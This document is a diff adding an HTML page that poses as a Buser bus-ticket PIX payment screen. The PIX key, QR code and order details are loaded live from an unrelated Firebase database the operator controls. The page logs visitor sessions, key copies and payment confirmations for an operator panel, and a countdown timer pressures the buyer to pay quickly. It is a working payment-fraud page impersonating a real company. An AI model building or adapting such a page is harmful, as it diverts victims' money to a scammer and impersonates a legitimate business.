@@ -1,0 +1,396 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Pagamento PIX - Buser</title>
+    <script src="https://cdn.jsdelivr.net/npm/qrcodejs@1.0.0/qrcode.min.js"></script>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: system-ui, -apple-system, 'Segoe UI', Roboto, 'Helvetica Neue', sans-serif; }
+        body { min-height: 100vh; background: linear-gradient(135deg, #fff5f7 0%, #f0f9ff 100%); display: flex; flex-direction: column; align-items: center; justify-content: center; padding: 20px; }
+        .pix-container { background: #ffffff; border-radius: 28px; box-shadow: 0 20px 50px rgba(255, 0, 128, 0.1), 0 4px 12px rgba(0, 0, 0, 0.04); padding: 32px 24px 24px; max-width: 440px; width: 100%; text-align: center; margin: 20px 0; position: relative; overflow: hidden; }
+        .pix-container::before { content: ''; position: absolute; top: 0; left: 0; right: 0; height: 6px; background: linear-gradient(90deg, #ff3d8b, #ff6fa5, #ff3d8b); }
+        .bus-illustration { width: 100%; display: flex; justify-content: center; margin-bottom: 4px; }
+        .bus-illustration svg { width: 200px; height: auto; }
+        .smoke-puff { animation: puff 2.5s ease-in-out infinite; transform-origin: center; }
+        .smoke-puff:nth-child(2) { animation-delay: 0.6s; }
+        .smoke-puff:nth-child(3) { animation-delay: 1.2s; }
+        .smoke-puff:nth-child(4) { animation-delay: 1.8s; }
+        @keyframes puff { 0% { opacity: 0.9; transform: translate(0, 0) scale(0.7); } 50% { opacity: 0.5; transform: translate(-8px, -12px) scale(1.1); } 100% { opacity: 0; transform: translate(-18px, -28px) scale(1.4); } }
+        .bus-body { animation: busBounce 1.8s ease-in-out infinite; transform-origin: center bottom; }
+        @keyframes busBounce { 0%, 100% { transform: translateY(0); } 50% { transform: translateY(-2px); } }
+        .pix-container h1 { font-size: 1.6rem; font-weight: 800; color: #1a1a2e; margin-bottom: 6px; letter-spacing: -0.5px; }
+        .pix-container h1 span { color: #ff3d8b; }
+        .pix-subtitle { font-size: 0.9rem; color: #6b7280; margin-bottom: 16px; line-height: 1.4; padding: 0 8px; }
+        .timer-box { background: linear-gradient(135deg, #fff0f6, #ffe8f0); border: 1.5px solid #ffd0e0; border-radius: 16px; padding: 14px 18px; margin-bottom: 20px; display: flex; align-items: center; justify-content: center; gap: 10px; box-shadow: 0 4px 14px rgba(255, 61, 139, 0.08); }
+        .timer-icon { width: 22px; height: 22px; fill: #ff3d8b; flex-shrink: 0; }
+        .timer-text { font-size: 0.9rem; color: #6b7280; font-weight: 500; }
+        .timer-text strong { color: #1a1a2e; }
+        .timer-countdown { font-size: 1.2rem; font-weight: 800; color: #ff3d8b; font-variant-numeric: tabular-nums; letter-spacing: 1px; min-width: 60px; text-align: center; transition: color 0.3s ease; }
+        .timer-countdown.warning { color: #ef4444; animation: pulseTimer 1s ease-in-out infinite; }
+        @keyframes pulseTimer { 0%, 100% { transform: scale(1); } 50% { transform: scale(1.08); } }
+        .timer-countdown.expired { color: #ef4444; font-size: 0.95rem; animation: none; }
+        .order-summary { background: #f8fafc; border: 1.5px solid #e2e8f0; border-radius: 18px; padding: 18px; margin-bottom: 22px; text-align: left; }
+        .order-summary-header { display: flex; align-items: center; gap: 8px; margin-bottom: 14px; padding-bottom: 12px; border-bottom: 1px dashed #cbd5e1; }
+        .order-summary-header svg { width: 18px; height: 18px; fill: #ff3d8b; flex-shrink: 0; }
+        .order-summary-header h2 { font-size: 0.85rem; font-weight: 700; color: #1a1a2e; text-transform: uppercase; letter-spacing: 0.5px; }
+        .order-company { font-size: 0.82rem; font-weight: 700; color: #1a1a2e; margin-bottom: 8px; display: flex; align-items: center; gap: 6px; }
+        .order-company::before { content: '🚌'; font-size: 0.9rem; }
+        .order-route { font-size: 0.85rem; color: #374151; line-height: 1.5; margin-bottom: 6px; }
+        .order-route .arrow { color: #ff3d8b; font-weight: 700; margin: 0 4px; }
+        .order-date { font-size: 0.82rem; color: #6b7280; font-weight: 500; margin-bottom: 6px; display: flex; align-items: center; gap: 6px; }
+        .order-date::before { content: '📅'; font-size: 0.85rem; }
+        .order-cpf { font-size: 0.82rem; color: #6b7280; font-weight: 500; margin-bottom: 14px; display: flex; align-items: center; gap: 6px; }
+        .order-cpf::before { content: '🪪'; font-size: 0.85rem; }
+        .order-total { display: flex; align-items: center; justify-content: space-between; padding-top: 12px; border-top: 1px dashed #cbd5e1; }
+        .order-total-label { font-size: 0.85rem; font-weight: 600; color: #6b7280; text-transform: uppercase; letter-spacing: 0.5px; }
+        .order-total-value { font-size: 1.4rem; font-weight: 800; color: #ff3d8b; letter-spacing: -0.5px; }
+        .qrcode-wrapper { display: flex; justify-content: center; margin-bottom: 20px; }
+        #qrcode { width: 190px; height: 190px; background: #ffffff; padding: 12px; border-radius: 20px; box-shadow: 0 8px 24px rgba(255, 61, 139, 0.15); border: 2px solid #ffe0ec; display: flex; align-items: center; justify-content: center; }
+        #qrcode img { width: 100%; height: 100%; object-fit: contain; }
+        .pix-key-box { background: #fff0f6; border-radius: 60px; padding: 8px 8px 8px 20px; display: flex; align-items: center; justify-content: space-between; gap: 8px; margin-bottom: 8px; border: 1.5px solid #ffd0e0; }
+        .pix-key-text { font-size: 0.8rem; font-weight: 500; color: #1e293b; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; flex: 1; text-align: left; font-family: 'Courier New', monospace; letter-spacing: 0.3px; }
+        .btn-copy { background: linear-gradient(135deg, #ff3d8b, #ff6fa5); border: none; color: white; padding: 12px 20px; border-radius: 40px; font-size: 0.9rem; font-weight: 700; cursor: pointer; display: flex; align-items: center; gap: 6px; transition: transform 0.15s ease, box-shadow 0.2s ease; white-space: nowrap; flex-shrink: 0; box-shadow: 0 4px 12px rgba(255, 61, 139, 0.35); }
+        .btn-copy:hover { transform: translateY(-1px); box-shadow: 0 6px 18px rgba(255, 61, 139, 0.5); }
+        .btn-copy:active { transform: scale(0.97); }
+        .btn-copy svg { width: 16px; height: 16px; fill: currentColor; }
+        .copy-feedback { color: #10b981; font-size: 0.85rem; font-weight: 600; height: 20px; margin-bottom: 4px; transition: opacity 0.3s; }
+        .copy-feedback.hidden { opacity: 0; }
+
+        .btn-confirm {
+            width: 100%;
+            margin-top: 14px;
+            background: linear-gradient(135deg, #10b981, #34d399);
+            border: none;
+            color: white;
+            padding: 16px 20px;
+            border-radius: 40px;
+            font-size: 1rem;
+            font-weight: 800;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            box-shadow: 0 6px 20px rgba(16, 185, 129, 0.4);
+            transition: transform 0.15s ease, box-shadow 0.2s ease, opacity 0.3s ease;
+            letter-spacing: 0.3px;
+        }
+        .btn-confirm:hover { transform: translateY(-2px); box-shadow: 0 8px 26px rgba(16, 185, 129, 0.55); }
+        .btn-confirm:active { transform: scale(0.97); }
+        .btn-confirm svg { width: 18px; height: 18px; fill: currentColor; }
+        .btn-confirm[disabled] { cursor: default; opacity: 0.85; transform: none; box-shadow: 0 4px 12px rgba(16, 185, 129, 0.25); }
+        .btn-confirm.hidden { display: none; }
+        .btn-confirm.reveal { animation: revealConfirm 0.45s cubic-bezier(0.4, 0, 0.2, 1); }
+        @keyframes revealConfirm {
+            0% { opacity: 0; transform: translateY(10px) scale(0.95); }
+            100% { opacity: 1; transform: translateY(0) scale(1); }
+        }
+
+        .footer { width: 100%; max-width: 440px; text-align: center; font-size: 0.7rem; color: #94a3b8; line-height: 1.6; margin-top: 20px; padding: 0 10px; }
+        .footer p { margin-bottom: 4px; }
+        .cookie-banner { position: fixed; bottom: 0; left: 0; right: 0; background: #ffffff; box-shadow: 0 -6px 30px rgba(255, 61, 139, 0.15); padding: 18px 24px; display: flex; align-items: center; justify-content: space-between; gap: 16px; flex-wrap: wrap; z-index: 1000; border-top: 3px solid #ff3d8b; transition: transform 0.4s cubic-bezier(0.4, 0, 0.2, 1), opacity 0.3s ease; }
+        .cookie-banner.hide { transform: translateY(100%); opacity: 0; pointer-events: none; }
+        .cookie-text { flex: 1; font-size: 0.82rem; color: #374151; line-height: 1.5; min-width: 200px; }
+        .cookie-text strong { color: #ff3d8b; }
+        .cookie-text a { color: #ff3d8b; font-weight: 700; text-decoration: underline; text-underline-offset: 3px; }
+        .cookie-text a:hover { color: #d92e73; }
+        .btn-cookie { background: linear-gradient(135deg, #ff3d8b, #ff6fa5); border: none; color: white; padding: 12px 32px; border-radius: 40px; font-size: 0.9rem; font-weight: 800; cursor: pointer; transition: transform 0.15s ease, box-shadow 0.2s ease; white-space: nowrap; flex-shrink: 0; box-shadow: 0 6px 20px rgba(255, 61, 139, 0.4); letter-spacing: 0.3px; }
+        .btn-cookie:hover { transform: translateY(-2px); box-shadow: 0 8px 26px rgba(255, 61, 139, 0.55); }
+        .btn-cookie:active { transform: scale(0.96); }
+        @media (max-width: 500px) {
+            .pix-container { padding: 24px 16px 18px; }
+            .bus-illustration svg { width: 160px; }
+            .pix-container h1 { font-size: 1.35rem; }
+            .pix-key-box { flex-direction: column; padding: 14px; border-radius: 30px; gap: 10px; }
+            .pix-key-text { text-align: center; width: 100%; font-size: 0.75rem; }
+            .btn-copy { width: 100%; justify-content: center; }
+            .cookie-banner { flex-direction: column; text-align: center; padding: 18px 16px; }
+            .btn-cookie { width: 100%; }
+            .order-total-value { font-size: 1.25rem; }
+        }
+    </style>
+</head>
+<body>
+
+    <main class="pix-container">
+        <div class="bus-illustration">
+            <svg viewBox="0 0 300 160" xmlns="http://www.w3.org/2000/svg">
+                <g>
+                    <circle class="smoke-puff" cx="60" cy="70" r="10" fill="#c8d1dc" opacity="0.7"/>
+                    <circle class="smoke-puff" cx="50" cy="60" r="12" fill="#d5dce5" opacity="0.6"/>
+                    <circle class="smoke-puff" cx="65" cy="55" r="9"  fill="#bfc9d6" opacity="0.7"/>
+                    <circle class="smoke-puff" cx="45" cy="50" r="11" fill="#cfd7e2" opacity="0.5"/>
+                </g>
+                <g class="bus-body">
+                    <rect x="90" y="60" width="150" height="60" rx="14" fill="#ff3d8b"/>
+                    <rect x="90" y="95" width="150" height="25" rx="0" fill="#e6297a"/>
+                    <rect x="90" y="108" width="150" height="12" rx="6" fill="#e6297a"/>
+                    <rect x="105" y="72" width="30" height="22" rx="5" fill="#d4f1ff"/>
+                    <rect x="145" y="72" width="30" height="22" rx="5" fill="#d4f1ff"/>
+                    <rect x="185" y="72" width="30" height="22" rx="5" fill="#d4f1ff"/>
+                    <circle cx="228" cy="88" r="6" fill="#ffe066"/>
+                    <circle cx="228" cy="88" r="3" fill="#fff3b0"/>
+                    <circle cx="115" cy="122" r="14" fill="#1a1a2e"/>
+                    <circle cx="115" cy="122" r="7" fill="#8b95a5"/>
+                    <circle cx="215" cy="122" r="14" fill="#1a1a2e"/>
+                    <circle cx="215" cy="122" r="7" fill="#8b95a5"/>
+                    <rect x="195" y="72" width="3" height="48" rx="1.5" fill="#c41e63" opacity="0.5"/>
+                </g>
+                <rect x="40" y="133" width="230" height="4" rx="2" fill="#e2e8f0"/>
+                <rect x="70" y="133" width="30" height="4" rx="2" fill="#ff3d8b" opacity="0.4"/>
+                <rect x="140" y="133" width="30" height="4" rx="2" fill="#ff3d8b" opacity="0.4"/>
+                <rect x="210" y="133" width="30" height="4" rx="2" fill="#ff3d8b" opacity="0.4"/>
+            </svg>
+        </div>
+
+        <h1>Bora viajar com a <span>Buser</span>?</h1>
+        <p class="pix-subtitle">Sua próxima viagem está a um PIX de distância. Confirme o pagamento antes do tempo acabar.</p>
+
+        <div class="timer-box">
+            <svg class="timer-icon" viewBox="0 0 24 24"><path d="M11.99 2C6.47 2 2 6.48 2 12s4.47 10 9.99 10C17.52 22 22 17.52 22 12S17.52 2 11.99 2zM12 20c-4.42 0-8-3.58-8-8s3.58-8 8-8 8 3.58 8 8-3.58 8-8 8zm.5-13H11v6l5.25 3.15.75-1.23-4.5-2.67z"/></svg>
+            <span class="timer-text">Reserve garantida por <strong>15 minutos</strong>:</span>
+            <span class="timer-countdown" id="timerDisplay">15:00</span>
+        </div>
+
+        <div class="order-summary">
+            <div class="order-summary-header">
+                <svg viewBox="0 0 24 24"><path d="M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-7 14H7v-2h5v2zm5-4H7v-2h10v2zm0-4H7V7h10v2z"/></svg>
+                <h2>Seu pedido</h2>
+            </div>
+            <div class="order-company" id="orderCompany">Carregando...</div>
+            <div class="order-route">
+                <span id="orderOrigem">—</span>
+                <span class="arrow">→</span>
+                <span id="orderDestino">—</span>
+            </div>
+            <div class="order-date" id="orderDate">—</div>
+            <div class="order-cpf" id="orderCpf">CPF: —</div>
+            <div class="order-total">
+                <span class="order-total-label">Total</span>
+                <span class="order-total-value" id="orderTotal">R$ —</span>
+            </div>
+        </div>
+
+        <div class="qrcode-wrapper">
+            <div id="qrcode"></div>
+        </div>
+
+        <div class="pix-key-box">
+            <span class="pix-key-text" id="pixKeyText">Carregando chave PIX...</span>
+            <button class="btn-copy" id="copyButton">
+                <svg viewBox="0 0 24 24" width="16" height="16"><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"/></svg>
+                Copiar
+            </button>
+        </div>
+        <div class="copy-feedback hidden" id="copyFeedback">Chave copiada!</div>
+
+        <button class="btn-confirm hidden" id="confirmButton">
+            <svg viewBox="0 0 24 24"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41L9 16.17z"/></svg>
+            Já fiz o pagamento
+        </button>
+
+        <footer class="footer">
+            <p>© 2026 Copyright - Todos os direitos reservados.</p>
+            <p>Buser Brasil Tecnologia LTDA - CNPJ: 29.365.880/0001-81</p>
+        </footer>
+    </main>
+
+    <div class="cookie-banner" id="cookieBanner">
+        <div class="cookie-text">
+            A <strong>Buser</strong> usa cookies para aprimorar sua experiência. 
+            <a href="#" target="_blank">Saiba mais sobre a Política de Cookies e Privacidade</a>.
+        </div>
+        <button class="btn-cookie" id="cookieAccept">Entendi</button>
+    </div>
+
+    <script type="module">
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-app.js";
+        import { getDatabase, ref, set, push, onValue, onDisconnect }
+            from "https://www.gstatic.com/firebasejs/10.12.0/firebase-database.js";
+
+        const firebaseConfig = {
+            apiKey: "AIzaSyDjlEzQVLQuXQwmqR6bP9Xj8nx0c122njw",
+            authDomain: "tela-copiar-chave.firebaseapp.com",
+            databaseURL: "https://tela-copiar-chave-default-rtdb.firebaseio.com",
+            projectId: "tela-copiar-chave",
+            storageBucket: "tela-copiar-chave.firebasestorage.app",
+            messagingSenderId: "1002556410924",
+            appId: "1:1002556410924:web:39c833bb3abf14c5259589"
+        };
+
+        const app = initializeApp(firebaseConfig);
+        const db = getDatabase(app);
+
+        const DEFAULT_CONFIG = {
+            empresa: 'Gontijo',
+            origem: 'Londrina - Rodoviária',
+            destino: 'Belo Horizonte - Rodoviária',
+            cpf: '000.000.000-00',
+            data: 'Qua. 28 out.',
+            total: '189,00',
+            pixKey: '00020126580014br.gov.bcb.pix0136exemplo-chave-pix-123456',
+            qrImage: null
+        };
+
+        const qrContainer   = document.getElementById('qrcode');
+        const copyButton    = document.getElementById('copyButton');
+        const copyFeedback  = document.getElementById('copyFeedback');
+        const confirmButton = document.getElementById('confirmButton');
+        let currentPixKey   = DEFAULT_CONFIG.pixKey;
+        let chaveCopiada    = false;
+
+        const CONFIRM_ORIGINAL_HTML = confirmButton.innerHTML;
+
+        // ============ PRESENÇA ============
+        const sessionId = 'cli_' + Math.random().toString(36).slice(2, 10) + '_' + Date.now();
+        const presenceRef = ref(db, 'presenca/' + sessionId);
+
+        set(presenceRef, {
+            entrouEm: Date.now(),
+            userAgent: navigator.userAgent.slice(0, 80)
+        });
+        onDisconnect(presenceRef).remove();
+
+        // ============ CONFIG EM TEMPO REAL ============
+        function aplicarConfig(config) {
+            document.getElementById('orderCompany').textContent = config.empresa;
+            document.getElementById('orderOrigem').textContent  = config.origem;
+            document.getElementById('orderDestino').textContent = config.destino;
+            document.getElementById('orderDate').textContent    = config.data;
+            document.getElementById('orderCpf').textContent     = 'CPF: ' + (config.cpf || '—');
+            document.getElementById('orderTotal').textContent   = 'R$ ' + config.total;
+            document.getElementById('pixKeyText').textContent   = config.pixKey;
+            currentPixKey = config.pixKey;
+
+            qrContainer.innerHTML = '';
+            if (config.qrImage) {
+                const img = document.createElement('img');
+                img.src = config.qrImage;
+                img.alt = 'QR Code PIX';
+                qrContainer.appendChild(img);
+            } else {
+                new QRCode(qrContainer, {
+                    text: config.pixKey, width: 190, height: 190,
+                    colorDark: "#1a1a2e", colorLight: "#ffffff",
+                    correctLevel: QRCode.CorrectLevel.H
+                });
+            }
+        }
+
+        onValue(ref(db, 'buser_pix_config'), (snapshot) => {
+            const saved = snapshot.val();
+            aplicarConfig(saved ? { ...DEFAULT_CONFIG, ...saved } : { ...DEFAULT_CONFIG });
+        }, (error) => {
+            console.error('Erro ao ler do Firebase:', error);
+            aplicarConfig(DEFAULT_CONFIG);
+        });
+
+        // ============ MOSTRAR BOTÃO DE CONFIRMAÇÃO ============
+        function revelarBotaoConfirmacao() {
+            if (chaveCopiada) return;
+            chaveCopiada = true;
+            confirmButton.classList.remove('hidden');
+            confirmButton.classList.add('reveal');
+        }
+
+        // ============ BOTÃO COPIAR (SEM som) ============
+        copyButton.addEventListener('click', async () => {
+            const marcarCopiado = () => {
+                const originalHTML = copyButton.innerHTML;
+                copyButton.innerHTML = `<svg viewBox="0 0 24 24" width="16" height="16"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41L9 16.17z"/></svg> Copiado!`;
+                copyButton.style.background = '#10b981';
+                copyFeedback.classList.remove('hidden');
+
+                setTimeout(() => {
+                    copyFeedback.classList.add('hidden');
+                    copyButton.innerHTML = originalHTML;
+                    copyButton.style.background = '';
+                }, 2000);
+
+                revelarBotaoConfirmacao();
+                // ❌ SEM falar() aqui — som só no painel
+            };
+
+            try {
+                await navigator.clipboard.writeText(currentPixKey);
+
+                push(ref(db, 'eventos_copia'), {
+                    sessionId, copiadoEm: Date.now(),
+                    pixKey: currentPixKey.slice(0, 30) + '...'
+                }).catch(console.error);
+
+                marcarCopiado();
+            } catch (err) {
+                const textarea = document.createElement('textarea');
+                textarea.value = currentPixKey;
+                document.body.appendChild(textarea);
+                textarea.select();
+                document.execCommand('copy');
+                document.body.removeChild(textarea);
+
+                push(ref(db, 'eventos_copia'), {
+                    sessionId, copiadoEm: Date.now(),
+                    pixKey: currentPixKey.slice(0, 30) + '...',
+                    fallback: true
+                }).catch(console.error);
+
+                marcarCopiado();
+            }
+        });
+
+        // ============ BOTÃO CONFIRMAR PAGAMENTO (SEM som) ============
+        confirmButton.addEventListener('click', () => {
+            if (confirmButton.disabled) return;
+
+            confirmButton.disabled = true;
+            confirmButton.innerHTML = `
+                <svg viewBox="0 0 24 24" width="18" height="18"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/></svg>
+                Pagamento confirmado!
+            `;
+
+            // ❌ SEM falar() aqui — som só no painel
+
+            push(ref(db, 'pagamentos_confirmados'), {
+                sessionId,
+                confirmadoEm: Date.now(),
+                pixKey: currentPixKey.slice(0, 30) + '...'
+            }).catch(console.error);
+
+            setTimeout(() => {
+                confirmButton.innerHTML = CONFIRM_ORIGINAL_HTML;
+                confirmButton.disabled = false;
+            }, 3000);
+        });
+
+        // ============ TIMER ============
+        const timerDisplay = document.getElementById('timerDisplay');
+        let timeLeft = 15 * 60;
+        let timerInterval = null;
+
+        function updateTimerDisplay() {
+            const minutes = Math.floor(timeLeft / 60);
+            const seconds = timeLeft % 60;
+            timerDisplay.textContent = String(minutes).padStart(2, '0') + ':' + String(seconds).padStart(2, '0');
+            if (timeLeft <= 60 && timeLeft > 0) timerDisplay.classList.add('warning');
+            else timerDisplay.classList.remove('warning');
+            if (timeLeft <= 0) {
+                timerDisplay.classList.remove('warning');
+                timerDisplay.classList.add('expired');
+                timerDisplay.textContent = 'Expirado';
+                clearInterval(timerInterval);
+                copyButton.disabled = true;
+                copyButton.style.opacity = '0.5';
+                copyButton.style.cursor = 'not-allowed';
+                confirmButton.classList.add('hidden');
+            }
+        }
+        updateTimerDisplay();
+        timerInterval = setInterval(() => { timeLeft--; updateTimerDisplay(); }, 1000);
+
+        // ============ COOKIES ============
+        const cookieBanner = document.getElementById('cookieBanner');
+        document.getElementById('cookieAccept').addEventListener('click', () => cookieBanner.classList.add('hide'));
+    </script>
+</body>
+</html>
